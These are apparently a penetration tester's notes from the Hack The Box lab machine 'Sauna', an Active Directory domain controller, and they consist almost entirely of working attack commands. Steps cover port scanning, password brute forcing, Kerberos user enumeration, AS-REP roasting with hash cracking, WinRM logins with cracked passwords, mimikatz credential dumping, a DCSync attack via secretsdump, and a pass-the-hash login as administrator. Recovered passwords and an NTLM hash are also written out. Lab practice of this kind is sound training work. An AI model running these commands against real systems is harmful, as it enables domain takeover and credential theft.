### Enumeration
```
IP=10.10.10.10
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 53
	- DNS
- 80
	- IIS 10
- 88
	- kerberos
- 135
	- RPC
- 139
	- RPC
- 389
	- Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
- 445
	- smb
- 464
	- kpasswd5
- 593
	- RPC
- 636
	- tcpwrapped
- 3268
	- Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
- 3269
	- tcpwrapped
- 5985
	- winrm
- 9389
	- .NET Message Framing
- 47001
	- RPC
- 49152-49158
	- RPC
- 49169
	- RPC
- 49170
	- RPC
- 49179
	- RPC
### Foothold
- 21
	- ftp anonymous@$IP
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
- DNS
	- nslookup
		- server $IP
		- 127.0.0.1
	- dig @$IP domain
		- If domain resolves
			- dig axfr @$IP domain
	- Failed
- RPC/ SMB
	- enum4linux $IP
	- crackmapexec smb $IP -u guest -p "" --rid-brute
	- crackmapexec smb $IP -u "" -p "" --pass-pol
	- rpcclient -U '' $IP
		- enumdomusers
		- queryusergroups RID
		- queryuser RID
- 445
	- smbclient -N -L //$IP
		- Anonymous login successful, no shares
	- nmap --script smb-vuln* -p135,139,445 $IP
- LDAP
	- ldapsearch -x -h 10.10.10.175 -s base namingcontexts
		- DC=EGOTISTICAL-BANK,DC=LOCAL
- 88
	- kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
		- administrator, hsmith, fsmith, sauna
		- fsmith looks like someone from the teams page. First initial last name usernames. Put all into users.txt
		- impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
		- crack hash 
			- hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
			- fsmith - Thestrokes23
			- Connect: evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
- 80
	- Default landing page
	- Versions
	- Team
		- Fergus Smith
		- Shaun Coins
		- Hugo Bear
		- Bowie Taylor
		- Sophie Driver
		- Steven Kerb
	- Put 
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Windows
- fsmith
	- whoami /all
	- Root drive directory
	- net user USERNAME
		- Check group memberships
	- systeminfo
		- `./wes.py ~/OSCP/boxes/BOX_NAME/systeminfo.txt  > ~/OSCP/boxes/BOX_NAME/systeminfo_exploits.txt`
	- history
		- (Get-PSReadLineOption).HistorySavePath
	- Users with console
		- administrator, hsmith, fsmith, krbtgt, guest, svc_loanmanager
	- Services
		- PS1: `Get-Service | Select-Object -Property Name, DisplayName, Status
		- Unquoted
			- cmd
				- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
				- wmic service get name,displayname,pathname
			- PS1
				- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
			- icacls Filepath before .exe
				- Looking for W or F
	- netstat -ano
		- Active ports
	- mimkatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
	- winpeas
		- .\winPEAS.exe cmd fast > sauna_winpeas_fast
		- Auto logon
			- EGOTISTICALBANK\svc_loanmanager:Moneymakestheworldgoround!
			- Creds found from this commands
				- reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
- svc_loanmanager
	- Connect
		- evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
	- Bloodhound
		- .\Sharphound.exe
		- Open in bloodhound on kali
			- Outbound first degree object control
				- GetChanges and GetChangesAll over the DC. Leads to DCSync Attack
			- Attack
				- impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
					- Dumps all of the creds
					- Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
				- .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
					- Dumps all of the creds
- administrator
	- Connect
		- impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
		- evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff

### Credentials
### Lessons Learned